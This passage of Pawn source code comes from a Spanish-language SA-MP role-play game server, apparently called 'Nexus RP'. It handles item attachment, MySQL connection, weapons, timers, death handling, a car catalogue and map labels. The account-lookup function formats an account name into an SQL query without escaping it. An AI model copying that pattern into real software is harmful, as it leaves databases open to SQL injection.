        if(objetoid >= 47 && objetoid <= 49) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.067999,0.053999,-0.006999,-110.800018,-20.899999,3.499995,0.482998,0.710998,0.414999); //Munición pequeña
	    if(objetoid == 50) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.129999,0.076999,-0.022999,-108.799964,163.299972,3.499995,0.484999,0.847999,0.408999); //Munición escopeta
		if(objetoid >= 51 && objetoid <= 53) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.145999,0.071999,-0.008000,-107.200004,172.799987,3.499995,0.445999,0.910999,0.476999); //Munición grande
		
		if(objetoid == 54) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.034000,0.063000,-0.037999,164.500000,14.599996,-4.700009,1.000000,1.000000,1.000000); //Granada cegadora
		
		if(objetoid >= 55 && objetoid <= 57) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.216999,0.037999,-0.002999,-13.699973,-98.399971,3.000000,0.839000,0.423999,0.645000); //Doritos, patatas y nachos
		if(objetoid == 58 || objetoid == 59) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.072000,0.036999,-0.026000,-11.800009,175.100036,3.000000,1.000000,1.000000,1.000000); //Sprunk y fanta
		if(objetoid == 60) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.134000,0.001999,-0.122000,-37.200008,-149.699951,-37.999996,1.000000,1.000000,1.000000); //Botella agua
		if(objetoid == 61) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.114000,0.069000,-37.200008,-173.000015,3.499995,1.000000,1.000000,1.000000); //Botella cerveza
		if(objetoid == 62) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.077000,0.037999,-0.026000,-37.200008,-174.300003,3.499995,1.000000,1.000000,1.000000); //Copa vino
		if(objetoid == 63 || objetoid == 64) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.081000,0.037999,-0.012999,-37.200008,172.500061,3.499995,1.000000,1.000000,1.000000); //Vaso de whisky y ron
		if(objetoid == 65) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.125999,0.037999,-0.006999,-143.300033,-3.300006,144.699966,1.000000,1.000000,0.833999); //Hamburguesa
		if(objetoid == 66) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.037999,-0.026000,-37.200008,82.199996,-175.000000,1.000000,1.000000,1.000000); //Burrito
		if(objetoid == 67) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.293000,0.108000,-0.049999,-116.499977,170.400054,3.799995,1.000000,1.000000,1.000000); //Pizza
		if(objetoid == 68) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.144999,-0.009999,0.027000,-23.500009,-173.399993,3.499995,1.000000,1.000000,1.000000); //Móvil
		if(objetoid == 69) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.036000,0.037999,0.054999,-37.200008,82.199996,3.499995,1.000000,1.000000,1.000000); //Mechero
		if(objetoid == 70) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.038000,-0.026000,-37.200008,82.199996,3.499996,1.000000,1.000000,1.000000); //Cigarrillos
		if(objetoid == 71) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.096000,0.066999,-25.500007,179.099990,3.499995,1.000000,1.000000,1.000000); //Botella de ron
		if(objetoid == 72) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.092000,0.045000,-37.200008,-165.699996,3.499995,1.000000,1.000000,1.000000); //Botella de whisky
		if(objetoid == 73) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.072000,0.037999,-0.038000,-15.100006,-158.999984,3.499995,1.000000,1.000000,1.000000); //Botella de vino
		if(objetoid == 74) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.037999,-0.026000,-37.200008,-18.400012,3.499995,1.000000,1.000000,1.000000); //Destornillador
		
		if(objetoid >= 75 && objetoid <= 79) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.150000,0.002999,-0.026000,-117.300010,-4.899999,81.599998,0.703999,0.758000,0.787999); //Fardos droga
		if(objetoid >= 80 && objetoid <= 84) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.036000,0.037999,0.054999,-37.200008,82.199996,3.499995,1.000000,1.000000,1.000000); //Bolsitas droga
		if(objetoid == 85) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.036000,0.037999,0.054999,-37.200008,82.199996,3.499995,1.000000,1.000000,1.000000); //Semillas maria y coca
		if(objetoid == 86) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.146999,0.037999,-0.098000,-37.200008,170.300018,3.499995,0.533999,0.475000,0.656000); //Planta maria
		
		if(objetoid >= 87 && objetoid <= 101) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,-0.014999,-0.005999,-0.018000,-35.700012,82.199996,-68.900001,1.038000,1.230000,1.000000); //Relojes
		if(objetoid >= 102 && objetoid <= 124) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.171999,0.079999,-0.111999,-124.399993,166.300018,-93.599990,1.038999,0.752000,0.854999); //Cajas de armamento
	}
	if(slot == 3)
	{
		if(ObjetoInfo[objetoid][IDArma] < 16){SetPlayerAttachedObject(playerid,3,ObjetoInfo[objetoid][ModeloObjeto],1, -0.1061, -0.1544, -0.0411, 0.0000, 60.0000, 60.0000, 1.0000);}
		if(ObjetoInfo[objetoid][IDArma] >= 16){SetPlayerAttachedObject(playerid,3,ObjetoInfo[objetoid][ModeloObjeto],1, -0.1061, -0.1544, -0.0411, 0.0000, 0.0000, 0.0000, 1.0000);}
	}
	return 1;
}

forward ConnectMySQL(); //Conectar a la base mysql NOTA: DEBE EXISTIR EL USUARIO 'Plantilla' PARA CONECTAR A LA BASE DE DATOS
public ConnectMySQL()
{
    printf("[MYSQL]: Conectando a la base de datos '%s'...", SQL_DB);
    mysql_debug(1);
    mysql_connect(SQL_HOST, SQL_USER, SQL_DB, SQL_PASS);
    mysql_query(1, "SELECT Nombre FROM usuarios WHERE Nombre = 'Plantilla'"); //Comprueba si se ha conectado correctamente
    mysql_store_result();
    new value;
	value = mysql_num_rows();
	mysql_free_result();
	if(value != 0)
	{
	    printf("[MYSQL]: Conectado satisfactoriamente a '%s'", SQL_DB);
	    ConectadoBaseDatos = 1;
	}
	else
	{
		printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    printf("[MYSQL]: >>ERROR<< No se pudo conectar a '%s'", SQL_DB);
	    printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    printf("ERROR");
	    ConectadoBaseDatos = 0;
	}
	return 1;
}

CheckAccountExists(account[])
{
	new string[128];
    format(string, sizeof(string), "SELECT Nombre FROM usuarios WHERE Nombre = '%s'", account);
    mysql_query(1, string);

	mysql_store_result();

	new value;
	value = mysql_num_rows();
	mysql_free_result();
	return value;
}

stock RemovePlayerWeapon(playerid, weaponid) //Quitar un arma de un jugador
{
    if(!IsPlayerConnected(playerid) || weaponid < 0 || weaponid > 50)
        return;
    new saveweapon[13], saveammo[13];
    for(new slot = 0; slot < 13; slot++)
        GetPlayerWeaponData(playerid, slot, saveweapon[slot], saveammo[slot]);
    ResetPlayerWeapons(playerid);
    for(new slot; slot < 13; slot++)
    {
        if(saveweapon[slot] == weaponid || saveammo[slot] == 0)
            continue;
        GivePlayerWeapon(playerid, saveweapon[slot], saveammo[slot]);
    }
    GivePlayerWeapon(playerid, 0, 1);
}

stock GetPlayerWeaponAmmo(playerid, weapon) //Retorna la municion de un arma
{
    new wdata[13][2];
    for(new i; i < 13; i++)
    {
        GetPlayerWeaponData(playerid, i, wdata[i][0], wdata[i][1]);
        if(wdata[i][0] == weapon)return wdata[i][1];
    }
    return 0;
}

forward TSonidoDisparo(playerid); //Sistema sonido de armas
public TSonidoDisparo(playerid)
{
    TimerSonidoDisparo[playerid] = 0;
}

forward EncenderMotor(playerid); //Sistema arrancado de vehiculos
public EncenderMotor(playerid)
{
	new car = GetPlayerVehicleID(playerid);
	new string[128];
	format(string, sizeof(string), "* %s enciende el motor de su vehículo.", GetPlayerNameRP(playerid));
	ProxDetector(20.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(car,1,lights,alarm,doors,bonnet,boot,objective);
	EncendiendoMotor[playerid] = 0;
}

stock GetDistance(Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2) //Calcula distancia entre dos puntos
{
	return floatround(floatsqroot(((x1 - x2) * (x1 - x2)) + ((y1 - y2) * (y1 - y2)) + ((z1 - z2) * (z1 - z2))));
}

forward AntiBHTimer(playerid); //Timer anti BH
public AntiBHTimer(playerid)
{
	KillTimer(AntiBHTimerPlayer[playerid]);
	if(GetPlayerAnimationIndex(playerid) != 1195){return 1;}
	if(AntiBH[playerid] == 9){SendClientMessage(playerid, NaranjaOscuro, "Empiezas a cansarte de saltar.");}
	if(AntiBH[playerid] == 10){SendClientMessage(playerid, NaranjaOscuro, "Te has cansado de saltar. Si lo vuelves a intentar te caerás.");}
    if(AntiBH[playerid] > 10){ApplyAnimation(playerid, "GYMNASIUM", "gym_jog_falloff",4.1,0,1,1,0,0); SendClientMessage(playerid, NaranjaOscuro, "Te has cansado de saltar y no consigues mantener el equilibrio.");}
	AntiBH[playerid] ++;
	AntiBHTimerPlayer[playerid] = SetTimerEx("AntiBHTimer2", 20000, false, "d", playerid);
    return 1;
}

forward AntiBHTimer2(playerid); //Timer que permite volver a saltar
public AntiBHTimer2(playerid)
{
    AntiBH[playerid] = 0;
}

forward Congelar(playerid); //Congelar al jugador
public Congelar(playerid)
{
	TogglePlayerControllable(playerid, 0);
    return 1;
}

forward Descongelar(playerid); //Descongelar al jugador
public Descongelar(playerid)
{
	TogglePlayerControllable(playerid, 1);
    return 1;
}

forward Destasear(playerid); //Destasea al jugador
public Destasear(playerid)
{
    if(Taseado[playerid] > 0){Taseado[playerid] = 0;}
    TogglePlayerControllable(playerid, 1);
    return 1;
}

forward LlenarDeposito(playerid); //Timer para llenar el depósito
public LlenarDeposito(playerid)
{
    LlenandoDeposito[playerid] = 0;
	GameTextForPlayer(playerid, "~r~Deposito llenado", 3000, 5);
	TogglePlayerControllable(playerid, 1);
    return 1;
}

forward Muerto(playerid); //Sistema de muerte (en shock)
public Muerto(playerid)
{
	if(PlayerInfo[playerid][pMuerto] > 0)
	{
	    Muerte[playerid] = PlayerInfo[playerid][pMuerto];
		PlayerInfo[playerid][pMuerto] = 0;
		SpawnPlayer(playerid);
		if(PlayerInfo[playerid][pEncarcelado] == 0)
		{
	  		SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerInterior(playerid, 0);
		    PlayerInfo[playerid][pDineroBanco] -= 1000;
		    PlayerInfo[playerid][pExp] -= 2;
		    if(PlayerInfo[playerid][pExp] < 0){PlayerInfo[playerid][pExp] = 0;}
		    GetPlayerLevel(playerid);
		    SendClientMessage(playerid, Rosa, "Quedaste inconsciente. Una ambulancia te llevó al hospital.");
	        SendClientMessage(playerid, Rosa, "Te han retirado 1000$ de tu cuenta bancaria por las atenciones médicas.");
		}
		if(PlayerInfo[playerid][pEncarcelado] == 1 || PlayerInfo[playerid][pEncarcelado] == 2)
		{
			SendClientMessage(playerid, Rosa, "Quedaste inconsciente debido a las heridas.");
		}
	}
	return 1;
}

forward MuertoFlash(playerid); //Luz al morir
public MuertoFlash(playerid)
{
	if(PlayerInfo[playerid][pMuerto] > 0)
	{
	    RemovePlayerColorFade(playerid);
        FlashPlayerScreen(playerid, 0xFFFFFFFF, 1, 1);
	}
	return 1;
}

stock GetWeaponModel(weaponid) //Modelo de un arma
{
        switch(weaponid)
        {
            case 1:
                return 331;

                case 2..8:
                    return weaponid+331;

        case 9:
                    return 341;

                case 10..15:
                        return weaponid+311;

                case 16..18:
                    return weaponid+326;

                case 22..29:
                    return weaponid+324;

                case 30,31:
                    return weaponid+325;

                case 32:
                    return 372;

                case 33..45:
                    return weaponid+324;

                case 46:
                    return 371;
        }
        return 0;
}

forward RecargarTaser(playerid); //Recarga el táser (PD)
public RecargarTaser(playerid)
{
	TaserRecarga[playerid] = 0;
	return 1;
}

stock PonerUniformeFaccion(playerid) //Poner skin de uniforme de facción
{
	if(PlayerInfo[playerid][pFaccion] == 1)
    {
        switch(PlayerInfo[playerid][pServicioPD])
        {
            case 1: SetPlayerSkin(playerid, 71);
            case 2: SetPlayerSkin(playerid, 284);
            case 3: SetPlayerSkin(playerid, 280);
            case 4: SetPlayerSkin(playerid, 281);
            case 5: SetPlayerSkin(playerid, 267);
            case 6: SetPlayerSkin(playerid, 266);
            case 7: SetPlayerSkin(playerid, 265);
            case 8: SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
            case 9: SetPlayerSkin(playerid, 285);
            case 10: SetPlayerSkin(playerid, 283);
            case 11: SetPlayerSkin(playerid, 288);
            case 12: SetPlayerSkin(playerid, 211);
            case 13: SetPlayerSkin(playerid, 282);
        }
    }
    return 1;
}

stock DropObjeto(ObjetoID, Cantidad, Float:X, Float:Y, Float:Z, world, interior)
{
    if(ObjetoID != 0)
    {
        new Float:rotx, Float:roty, Float:rotz;
        for(new i = 0; i < sizeof(DropInfo); i++)
        {
            if(DropInfo[i][DropPosX] == 0.0 && DropInfo[i][DropPosY] == 0.0 && DropInfo[i][DropPosZ] == 0.0)
            {
                DropInfo[i][DropID] = ObjetoID;
                DropInfo[i][DropCantidad] = Cantidad;
                DropInfo[i][DropPosX] = X;
                DropInfo[i][DropPosY] = Y;
                DropInfo[i][DropPosZ] = Z;
                DropInfo[i][DropVWorld] = world;
                DropInfo[i][DropInterior] = interior;
                rotx = 80;
                roty = 0;
                rotz = 0;
                
                if(ObjetoID >= 47 && ObjetoID <= 49) rotx = 0;
                if(ObjetoID >= 50 && ObjetoID <= 53) rotx = 0; Z+=0.02;
                if(ObjetoID == 67) rotx = 0;
                if(ObjetoID >= 75 && ObjetoID <= 79) rotx = 0;
                if(ObjetoID >= 102 && ObjetoID <= 124) rotx = 0; Z+=0.02;
                
                DropObject[i] = CreateDynamicObject(ObjetoInfo[ObjetoID][ModeloObjeto], X, Y, Z-1, rotx, roty, rotz, world);
                SetTimerEx("DropObjetoTimer", 36000000, false, "i", i);
                return 1;
            }
        }
        return 1;
    }
    return 1;
}

forward DropObjetoTimer(i);
public DropObjetoTimer(i)
{
    DestroyDynamicObject(DropObject[i]);
    DropInfo[i][DropPosX] = 0.0;
    DropInfo[i][DropPosY] = 0.0;
    DropInfo[i][DropPosZ] = 0.0;
    DropInfo[i][DropID] = 0;
    DropInfo[i][DropCantidad] = 0;
    return 1;
}

catalogovehiculos(playerid, concesionario) //Catalogo
{
	// Si en el ciclo de elegir vehículo se sobrepasan el valor máximo o mínimo de ID de vehiculo, evitar error de ID
	if (EnCatalogoVeh[playerid] < MenorPosArray(concesionario))
    	EnCatalogoVeh[playerid] = MayorPosArray(concesionario);
	if (EnCatalogoVeh[playerid] > MayorPosArray(concesionario))
	    EnCatalogoVeh[playerid] = MenorPosArray(concesionario);

    TextDrawShowForPlayer(playerid, Modelo[EnCatalogoVeh[playerid]]);
 	TextDrawShowForPlayer(playerid, CocheNombre[EnCatalogoVeh[playerid]]);
  	TextDrawShowForPlayer(playerid, Costo[EnCatalogoVeh[playerid]]);
   	TextDrawShowForPlayer(playerid, Id[EnCatalogoVeh[playerid]]);
	return 1;
}

MayorPosArray(concesionario)
{
	new mayorpos;
	for(new i = 0; i < MAX_CAR_DATA; i++)
	{
		if(datacar[i][dcConcesionario] == concesionario)
		{
			mayorpos = i;
		}
	}
	return mayorpos;
}

MenorPosArray(concesionario)
{
	new menorpos;
	for(new i = 0; i < MAX_CAR_DATA; i++)
	{
		if(datacar[i][dcConcesionario] == concesionario)
		{
			menorpos = i;
			break;
		}
	}
	return menorpos;
}

GetPlayerConcesionarioEx(playerid) //Retorna ID de concesionario
{
	new Concesionario;
	for(new i = 0; i < 7; i ++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5, Concesionarios[i][cX], Concesionarios[i][cY], Concesionarios[i][cZ]))
		{
			Concesionario = i;
		}
	}
	return Concesionario;
}

GetPlayerConcesionario(playerid) //Retorna ID de concesionario + 1
{
	new Concesionario;
	for(new i = 0; i < 7; i ++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5, Concesionarios[i][cX], Concesionarios[i][cY], Concesionarios[i][cZ]))
		{
			Concesionario = i+1;
		}
	}
	return Concesionario;
}

//Gamemode
main()
{
	print(" ");
	print("Nexus RP - Hecho por Braun");
	print(" ");
}

public OnGameModeInit()
{
	new string[128];
    ConnectMySQL(); //Conectar a la base MYSQL
    AntiDeAMX(); //Evita desencriptar a partir del .AMX
    AddPlayerClass(2,1958.3783,1343.1572,1100.3746,269.1425,-1,-1,-1,-1,-1,-1); //Sistema de spawn
    AllowInteriorWeapons(1); //Permite armas en interiores
    DisableInteriorEnterExits(); //Desactiva entradas a locales
    EnableStuntBonusForAll(0); //Desactiva bonus por saltos y acrobacias
    SetTimer("TimerDeUnaHora",3600000,1); //Iniciar timer de una hora
    SetTimer("TimerDeUnMinuto",60000,1); //Inicia timer de un minuto
    SetTimer("TimerDeMedioMinuto",30000,1); //Inicia timer de medio minuto
    SetTimer("TimerDeMedioSegundo",500,1); //Inicia timer de medio segundo
    SetTimer("RandomWeather", 14400000, 1); //Tiempo aleatorio
    ManualVehicleEngineAndLights(); //Sistema arranque de vehiculos
    AreaDepositoLSPD = CreateDynamicPolygon(PuntosDeposito, 12, 17.5); //Área depósito LSPD
    
    ropa = LoadModelSelectionMenu("ropa.TXT"); //Sistema elección skin binco
    
    for(new i = 0; i < MAX_LSEDINFORMES; i++) InformeEmergencias[i][ieEstado] = NOEXISTE; //Comando /Informes LSED
    
    //3DTextLabels de entradas a lugares públicos
    CreateDynamic3DTextLabel("Departamento\nde policía", AzulClaro, 1555.0660, -1675.6772, 16.1953, 20, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada a LSPD
    CreateDynamic3DTextLabel("Los Santos", AmarilloClaro, 246.3626, 107.8716, 1003.2188, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida LSPD
    CreateDynamic3DTextLabel("/Parking", Amarillo, 1582.0264, -1678.7787, 5.8946, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Parking 1ª planta LSPD
    CreateDynamic3DTextLabel("2ª Planta", Amarillo, 1582.0264, -1674.8207, 5.8945, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada 2ª planta parking LSPD
    CreateDynamic3DTextLabel("1ª Planta", Amarillo, -1609.3883, 729.6197, -5.2422, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada 1ª planta parking LSPD
    CreateDynamic3DTextLabel("/Parking", Amarillo, -1605.4362, 729.6197, -5.2422, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Parking 2ª planta LSPD
    CreateDynamic3DTextLabel("Ascensor", Amarillo, 1568.6243,-1689.9784,6.2188, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Ascensor parking 1ª planta LSPD
    CreateDynamic3DTextLabel("Cárcel", Amarillo, 1524.4836,-1677.9070,6.2188, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Cárcel parking 1ª planta LSPD
    CreateDynamic3DTextLabel("Ascensor", Amarillo, -1594.2114,716.2331,-4.9063, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Ascensor parking 2ª planta LSPD
    CreateDynamic3DTextLabel("Cárcel", Amarillo, -1606.3357,672.0615,-4.9063, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Cárcel parking 1ª planta LSPD
    CreateDynamic3DTextLabel("Armería", AmarilloClaro, 270.3885,113.2809,1004.6172, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Armería LSPD entrada
    CreateDynamic3DTextLabel("Oficinas", AmarilloClaro, 221.2510,79.8274,1005.0391, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Armería LSPD salida
    CreateDynamic3DTextLabel("Ascensor", AmarilloClaro, 255.0220,126.2807,1003.2188, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Ascensor comisaría LSPD
    CreateDynamic3DTextLabel("Azotea", AmarilloClaro, 238.4005,114.8457,1010.2188, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Azotea entrada comisaría LSPD
    CreateDynamic3DTextLabel("Oficinas", AmarilloClaro, 1573.0088,-1670.1738,28.3956, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Azotea salida comisaría LSPD
    CreateDynamic3DTextLabel("Oficinas", AmarilloClaro, 249.0331,86.8339,1003.3804, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Celdas salida comisaría LSPD
    CreateDynamic3DTextLabel("Celdas", AmarilloClaro, 217.7758,117.4122,999.0216, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Celdas entrada comisaría LSPD
    CreateDynamic3DTextLabel("Ayuntamiento", Blanco, 1481.0206,-1771.1138,18.7958, 20, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada ayuntamiento
    CreateDynamic3DTextLabel("Los Santos", AmarilloClaro, 390.1899,173.7861,1008.3828, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida ayuntamiento
    CreateDynamic3DTextLabel("Ayuntamiento", Amarillo, 1437.2343,-1786.3534,33.4297, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada azotea ayuntamiento
    CreateDynamic3DTextLabel("Azotea", AmarilloClaro, 375.88223,164.720794,1025.78, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida azotea ayuntamiento
    CreateDynamic3DTextLabel("Garaje", AmarilloClaro, 366.64654,158.779937,1008.38, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada garaje ayuntamiento
    CreateDynamic3DTextLabel("Ayuntamiento", Amarillo, 1524.0345,-1825.3225,13.5469, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida garaje ayuntamiento
    CreateDynamic3DTextLabel("/Vestuario", AzulClaro, 267.6066,118.4081,1004.6172, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida garaje ayuntamiento
    CreateDynamicPickup(1275, 23, 267.6066,118.4081,1004.6172);
    CreateDynamic3DTextLabel("/Armeria", NaranjaOscuro, 220.0135,79.7864,1005.0391, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida garaje ayuntamiento
    CreateDynamicPickup(353, 23, 220.0135,79.7864,1005.0391);
    CreateDynamic3DTextLabel("Autoescuela",Amarillo,2045.6418,-1908.1290,13.5469, 20, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entra autoescuela Willowfield
    CreateDynamic3DTextLabel("Los Santos",AmarilloClaro,-2026.8535,-104.0617,1035.1719, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida autoescuela Willowfield
    CreateDynamic3DTextLabel("Hotel Commerce",Naranja,1498.4912,-1581.3987,13.5498, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0); //Entrada Hotel Commerce
    CreateDynamic3DTextLabel("Los Santos",AmarilloClaro,1726.9388,-1638.4977,20.2233, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 1, 18); //Salida Hotel Commerce
    CreateDynamic3DTextLabel("Motel Jefferson",Naranja,2232.6450,-1159.8384,25.8906, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0); //Entrada Motel Jefferson
    CreateDynamic3DTextLabel("Los Santos",AmarilloClaro,2215.0349,-1150.5457,1025.7969, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 1, 15); //Salida Motel Jefferson
    CreateDynamic3DTextLabel("Esto no es la entrada a \nun laboratorio secreto.\nLARGO",Gris,1489.3341,-1719.4640,8.2428, 1, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Easter Egg
    CreateDynamic3DTextLabel("Prisión Federal", NaranjaOscuro, 1797.9216,-1578.7523,14.0898, 20, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada Prisión Federal
    CreateDynamic3DTextLabel("Los Santos", AmarilloClaro, 2523.4546,-1301.8833,1048.2891, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida Prisión Federal
    CreateDynamic3DTextLabel("Patio de la prisión", AmarilloClaro, 2576.7878,-1289.9611,1044.1250, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada Patio Prisión Federal
    CreateDynamic3DTextLabel("Prisión Federal", NaranjaOscuro, 1772.0688,-1548.1400,9.9063, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida Patio Prisión Federal
    CreateDynamic3DTextLabel("Iglesia", AzulClaro, 2233.1997,-1333.3169,23.9816, 20, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada Iglesia Jefferson
    CreateDynamic3DTextLabel("Los Santos", AmarilloClaro, 1964.0940,-350.2319,1092.9454, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida Iglesia Jefferson
    CreateDynamic3DTextLabel("Estudios LSRTV", Amarillo, 648.7344,-1360.7629,13.5876, 20, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada LSRTV
    CreateDynamic3DTextLabel("Los Santos", AmarilloClaro, 248.5891,1783.5326,701.0859, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida LSRTV
    CreateDynamic3DTextLabel("Parking", AmarilloClaro, 258.6264,1777.5300,701.0859, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Entrada Parking LSRTV
    CreateDynamic3DTextLabel("Estudios LSRTV", AmarilloClaro, 732.8732,-1355.4661,15.1563, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Salida Parking LSRTV
    CreateDynamic3DTextLabel("Armería", AmarilloClaro, 2523.3840,-1281.3458,1048.2891, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Armería prisión federal entrada
    CreateDynamic3DTextLabel("Prisión Federal", AmarilloClaro, 1089.0194,-801.8175,1088.3660, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Armería prisión federal salida
    CreateDynamic3DTextLabel("/Vestuario",AzulClaro,1085.0271,-803.6704,1088.3669, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Prision federal
    CreateDynamicPickup(1275, 23, 1085.0271,-803.6704,1088.3669);
    CreateDynamic3DTextLabel("/Armeria",NaranjaOscuro,1086.6472,-807.9135,1088.3669, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Prision federal
    CreateDynamicPickup(353, 23, 1086.6472,-807.9135,1088.3669);
    CreateDynamic3DTextLabel("Patio de la prisión", AmarilloClaro, 1084.5272,-808.0339,1088.3669, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Armería - patio
    CreateDynamic3DTextLabel("Armería", AmarilloClaro, 1757.9861,-1560.4956,15.8120, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Patio - armería
    CreateDynamic3DTextLabel("Prisión", AmarilloClaro, 2529.6387,-1281.9346,1048.2891, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Puerta oficina - prisión
    CreateDynamic3DTextLabel("Oficina", AmarilloClaro, 2532.1252,-1281.9380,1048.2891, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Puerta oficina - prisión
    CreateDynamic3DTextLabel("/Bandeja", Naranja, 2567.2358,-1283.9948,1044.1250, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Comando comer prisión
	CreateDynamic3DTextLabel("/AutoReparar", Naranja, 2527.5347,-2073.0044,13.5469, 8, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Comando /AutoReparar
	CreateDynamic3DTextLabel("/AutoReparar", Naranja, 1908.0222,-1864.7769,13.5639, 8, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Comando /AutoReparar
	CreateDynamic3DTextLabel("Prisión federal", NaranjaOscuro, 1773.4933,-1577.7090,22.9530, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Azotea-prisión
